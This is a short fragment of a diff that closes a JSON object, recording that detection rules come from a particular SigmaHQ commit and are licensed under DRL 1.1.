+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
+}
